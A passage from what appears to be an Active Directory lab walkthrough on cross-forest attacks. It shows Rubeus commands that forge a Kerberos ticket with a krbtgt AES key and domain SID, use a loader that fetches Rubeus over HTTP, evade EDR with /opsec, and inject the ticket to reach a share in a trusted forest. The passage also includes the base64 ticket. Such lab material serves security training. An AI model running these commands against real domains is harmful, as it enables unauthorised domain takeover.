+C:\Users\Public\Loader.exe -Path http://127.0.0.1:8080/Rubeus.exe -args %Pwn% /user:administrator /ldap /service:krbtgt/eu.local /aes256:c197d2f364de43df95ff8ef720a1d3e2453c1aaf938085dfaa8b26b9dfcb507a /sid:S-1-5-21-3657428294-2017276338-1274645009 /opsec /nowrap
+<img src="./images/screenshot_375.png" alt="">
+
+<pre><code class="language-bash">doIFJzCCBSOgAwIBBaEDAgEWooIEIDCCBBxhggQYMIIEFKADAgEFoQobCEVVLkxPQ0FMoh0wG6ADAgECoRQwEhsGa3JidGd0GwhldS5sb2NhbKOCA+AwggPcoAMCARKhAwIBA6KCA84EggPKG4gtZs082njGNf6c8WG4oLtmihwoM8RaIPCAcZMRMhaPmYxJZgtNr5j85wBEk/J8VEWB0WI0JRNsmozeFbmi739S6DnUPSfocklkHMbEmBjGZV62o41vHb/Y6PbvWNEcngYJ6LGqQOteN/xwb+A+8b5hH+I516RZz0duo2gp7f0vrR64J9ERJU9FXw+JcsJOOHAAw8k1rjfEC1htzLylVUflRwSa58iS9elAf8WHUrdAdL2EIYVz5vEMw2cXEk3BmndR/vVj1ht+u/lKsYgAHbLMxKhhh9JI27dLH1EjP+kXrB710EnfReVCj+LrZd91UjIS1g28rSOZ8+dZmk2DjNfNRuXIPAf/Mn/CSBA3SCEmNL7yLpm294vMi+51RhyvtaVurXXdSZk/eT9fa4C2oUDv46ieaduuX4etn9MHL8MsWPNGz+yxp0z9H5z10zTSanPCJN+2QyFLwGDTVgdnCuoU69Po05gIocMvjuKyoo+/bhF2EScU5o5lzwzCQ0RylwMZZj3SnzTap4J+QmFAV6aQWeExI1xKvGCAi5odFaMaMvBbO8sbwwH1ivenPX20ab9wFMBshvFggoYec9Xn5fsqmX35GD7AgAcNZbbjfy0Nkmt2YbpB0GL3PkoYwFQr3d2cPYEHssS52dVI/N77oJx3Way9yKSgcNX/PdfgU0LJ2kkkG3g6/aG2EujkzZeNUDN27fN4oo2ItKU5Ub7gATJ2WXfBi27XgPLw6nmiew53dVCe4OddBJr6kCF6qFYXeYwkdeP2FTmDQEgG3jO5SZd2CGU+y8U+zj8I+ompgegu02YBBnT2g0Bwd9Boj4VFSx4rsGvY5dC6O6RWVHwiazZq1prpHUIdBPjcI9kVWUZkHYoLCjKG3L2XIw2o/ntdjG16VUI4yTVGKK82+JkKHdAEtFHMO9VQ3aQ7T0f8kTGxXQtRcknABMWlEIULJLbihZNV6Zbtw/B+0KqC1km9Dz7XgaFwic2jPpL6j0Kq5M4mdz5lfOi6OC4R4mU/1RlHK/AhjOYUa/R39oPlz1Ol8maMnV+THAn6jTbF8DKFGO68Fq3vPzcCg2N8iPaz4+Q11R7+FQzDKti1xr3YvEzppZUhsyip9sGR+xok0SA+sHaW3ikGx+XzbVKvX5HZkc5iuWwyrC3/m6iPBImilg5iCH9OEiUH/9RW0/gzTkJ/Ct5C+pUuqb52UBObnTu7XeZyq5RhxJjN/pxRwRJcW9XM3oX4PuSNVINOb9wzylrFbulN8/sCJzwYtBM32bqo4dd3WWfcm9LUvkMpx6OB8jCB76ADAgEAooHnBIHkfYHhMIHeoIHbMIHYMIHVoCswKaADAgESoSIEIA0w8k1JC4pSwgM7BXE5fr9KL35iDisZ3GqtmvzXUl5VoQobCEVVLkxPQ0FMohowGKADAgEBoREwDxsNYWRtaW5pc3RyYXRvcqMHAwUAQKAAAKQRGA8yMDI1MDIxMjIxNTY0MlqlERgPMjAyNTAyMTIyMTU2NDJaphEYDzIwMjUwMjEzMDc1NjQyWqcRGA8yMDI1MDIxOTIxNTY0MlqoChsIRVUuTE9DQUypHTAboAMCAQKhFDASGwZrcmJ0Z3QbCGV1LmxvY2Fs
+</code></pre>
+
+The command you provided is running Loader.exe with the -Path parameter to fetch Rubeus.exe from a local HTTP server. Then, -args passes additional arguments to Rubeus (silver):
+/user:administrator specifies the username to impersonate or target in the Kerberos-related action.
+/ldap tells Rubeus to interact with LDAP. This is often used in Kerberos ticket-related enumeration.
+/service:krbtgt/eu.local defines the service principal name (SPN) for which a Kerberos ticket is being requested or manipulated. In this case, it's the krbtgt account for the eu.local domain, which is a common target when dealing with Kerberos ticket attacks like Golden Tickets.
+/aes256:c197d2f364de43df95ff8ef720a1d3e2453c1aaf938085dfaa8b26b9dfcb507a supplies the AES-256 key for the account, the krbtgt account. This is often used in ticket-forging Golden Tickets.
+/sid:S-1-5-21-3657428294-2017276338-1274645009 provides the domain SID, which is crucial for crafting valid Kerberos tickets in Golden Ticket attacks.
+/opsec is an operational security-focused flag in Rubeus that aims to avoid suspicious activity or reduce detection by EDRs/AVs when performing ticket injection or ticket-related operations.
+/nowrap prevents Rubeus from wrapping base64-encoded output across multiple lines. This is useful when working with tools that require single-line encoded tickets.
+So, putting it all together, this is likely crafting or requesting a Kerberos ticket (possibly a Golden Ticket) for the administrator user in the eu.local domain using the krbtgt AES-256 key and domain SID, with some OPSEC considerations to reduce detection.
+<h1>Requesting a Service Ticket</h1>
+
+In the second step, we are injecting the forged ticket into our session and using it to authenticate against the CIFS (file sharing service) on euvendor.local forest domain. This allows us to establish a foothold at the forest level while still using the forged ticket. 
+By passing the ticket (/ptt), we ensure that all subsequent Kerberos authentication requests use this ticket, granting us high-level access in the root domain.
+We should encode the Rubeus argument(asktgs) with ArgSplit.bat and do the copy/paste into our session were Rubeus will be executed.
+ArgSplit.bat
+<img src="./images/screenshot_376.png" alt="">
+
+Running Rubeus.
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /service:CIFS/euvendor-dc.euvendor.local /dc:euvendor-dc.euvendor.local /ptt /ticket:<FORGEDTICKET>
+<img src="./images/screenshot_377.png" alt="">
+
+As we can see above we were able to Request the service ticket and inject it into our current session. We can also double check this with klist command.
+klist
+<img src="./images/screenshot_378.png" alt="">
+
+We now have the TGS for CIFS on euvendor.local. We can only access the resources explicitly shared with Domain Admins of eu.local as we have the access to euvendor-dc as domain admins of eu.local.
+dir \\euvendor-dc.euvendor.local\eushare
+<img src="./images/screenshot_379.png" alt="">
+
+<p>We are now able to access the eushare folder, but we can not access euadmins</p>
+
+
+
+
+
+
+
+
+<div class="part-navigation">
+            <a href="part-28-cross-forest-attacks-unconstrained-delegation.html"><ion-icon name="arrow-back-outline"></ion-icon> Previous: Cross Forest Attacks - Unconst</a>
+            <a href="part-30-cross-forest-attacks-injecting-sid-history-to-bypa.html">Next: Cross Forest Attacks - Injecti <ion-icon name="arrow-forward-outline"></ion-icon></a>
+          </div>
+        </div>
+      </article>
+    </div>
+  </main>
+  <script src="../assets/js/script.js"></script>
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+</body>
+</html>
